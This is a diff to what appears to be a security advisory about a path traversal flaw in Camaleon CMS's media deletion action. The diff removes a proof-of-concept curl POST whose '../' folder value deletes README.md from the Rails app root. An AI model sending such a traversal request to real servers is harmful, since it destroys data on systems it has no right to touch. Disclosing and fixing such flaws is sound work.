@@ -40,22 +40,6 @@ description: |
   Where it is joined in an unchecked manner with the root folder and
   then deleted.
 
-  **Proof of concept**
-  The following request would delete the file README.md in the top
-  folder of the Ruby on Rails application. (The values for auth_token,
-  X-CSRF-Token and _cms_session would also need to be replaced with
-  authenticated values in the curl command below)
-  ```
-  curl --path-as-is -i -s -k -X $'POST' \
-      -H $'X-CSRF-Token: [..]' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' -H $'Connection: keep-alive' \
-      -b $'auth_token=[..]; _cms_session=[..]' \
-      --data-binary $'versions=&thumb_size=&formats=&media_formats=&dimension=&private=&folder=..
-  2F..
-  2F..
-  2FREADME.md&media_action=del_file' \
-      $'https://<camaleon-host>/admin/media/actions?actions=true'
-  ```
-
   **Impact**
 
   This issue may lead to a defective CMS or system.
